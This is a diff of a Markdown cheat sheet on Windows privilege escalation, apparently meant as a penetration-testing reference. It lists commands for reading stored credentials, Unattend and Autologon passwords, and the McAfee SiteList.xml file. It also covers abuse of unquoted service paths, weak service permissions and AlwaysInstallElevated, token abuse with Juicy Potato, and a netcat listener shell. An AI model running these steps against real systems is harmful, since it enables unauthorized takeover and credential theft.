@@ -1,25 +1,19 @@
-# Win_Priv_Esc_Method
-Windows Privilege Escalation Methodology
+Windows Privilege Escalation by NCV
+===================================
 
-# Categories
-[Go to Stored Credentials]#Stored Credentials
-* Unattend Answer Files
-* Windows Kernel Exploit
-* Applications/Drivers Exploits
-* DLL Injection
-* Insecure File/Folder Permissions
-* Insecure Service Permissions
-* DLL Hijacking
-* Group Policy Preferences
-* Unquoted Service Path
-* Always Install Elevated
-* Token Manipulation
-* Insecure Registry Permissions
-* Autologon User Credential
-* User Account Control (UAC) Bypass
-* Insecure Named Pipes Permissions
+- [General Commands](#general-commands)
+- [Stored Credentials](#stored-credentials)
+- [Unattend Answer Files](#unattend-answer-files)
+- [Windows Kernel Exploits](#windows-kernel-exploits)
+- [Applications and Drivers Exploits](#applications-and-drivers-exploits)
+- [Insecure File or Folder Permissions](#insecure-file-or-folder-permissions)
+- [Unquoted Service Path](#unquoted-service-path)
+- [Always Install Elevated](#always-install-elevated)
+- [Insecure Service Permissions](#insecure-service-permissions)
+- [Token Manipulation](#token-manipulation)
+- [Autologon User Credentials](#autologon-user-credentials)
 
-## General
+# General Commands
 * systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
 * WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
 
@@ -42,7 +36,7 @@ Windows Privilege Escalation Methodology
 * netstat -ano
 * ipconfig /all
 * route print
-
+* 
 * tasklist /SVC > tasks.txt
 * schtasks /query /fo LIST /v > schedule.txt
 
@@ -60,7 +54,7 @@ Windows Privilege Escalation Methodology
 * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 
-## Stored Crendentials
+# Stored Credentials
 * net user
 * net user <user>
 * cmdkey /list
@@ -86,9 +80,8 @@ Windows Privilege Escalation Methodology
 
 * Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
   * %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml
- 
- 
-## Unattend Answer Files
+
+# Unattend Answer Files
 * Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator.  This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually.  If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system.  This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!
 * While it’s a good idea to search the entire drive, Unattend files are likely to be found within the following folders:
   * C:\unattend.xml
@@ -99,8 +92,7 @@ Windows Privilege Escalation Methodology
 
 ->  If you find one open it and search for <UserAccounts> tag. Stored as plaintext or base64.
 
-
-## Windows Kernel Exploits
+# Windows Kernel Exploits
 * systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
   * searchsploit 
   * google
@@ -121,7 +113,7 @@ Windows Privilege Escalation Methodology
    * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
    * Build exe to visual studio
 
-## Applications/Drivers Exploits
+# Applications and Drivers Exploits
 * wmic product get name, version, vendor > install_apps.txt
   * searchsploit
   * google
@@ -131,9 +123,8 @@ Windows Privilege Escalation Methodology
 * powershell and specific word: Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
   * searchsploit
   * google
-  
 
-## Insecure File/Folder Permissions
+# Insecure File or Folder Permissions
 * use: https://download.sysinternals.com/files/AccessChk.zip
 * Search for world writable files and directories:
   * accesschk.exe -uws "Everyone" "C:\Progrma Files"
@@ -161,7 +152,7 @@ Windows Privilege Escalation Methodology
 When you will open you will have evil to administrators groups:
  *  net localgroup Administrators
 
-## Unquoted Service Path
+# Unquoted Service Path
 * Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:
   * wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 
@@ -184,9 +175,9 @@ When you will open you will have evil to administrators groups:
 
 * after restart you will have nc listener.
 
-wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\\\" |findstr /i /v """
 
-## Always Install Elevated
+# Always Install Elevated
 * use the commands and if they return output then vulnerability exists:
   * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
   * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
@@ -202,7 +193,8 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
   * net localgroup administrators
   * users should exists
 
-## Insecure Service Permissions
+
+# Insecure Service Permissions
 * Detect is to find a service with weak permissions
   * accesschk.exe -uwcqv *
 * For Shorten output
@@ -224,7 +216,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 
 * Stop and start the service again and you’re a Local Admin!
 
-## Token Manipulation
+# Token Manipulation
 * whoami /priv
 * More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
   * SeDebugPrivilege
@@ -270,6 +262,6 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 2) https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.
 * Use: https://github.com/ohpe/juicy-potato
 
-## Autologon User Credentials
+# Autologon User Credentials
 * use the following command and if return output take autologon user credentials from regisrty:
   * reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
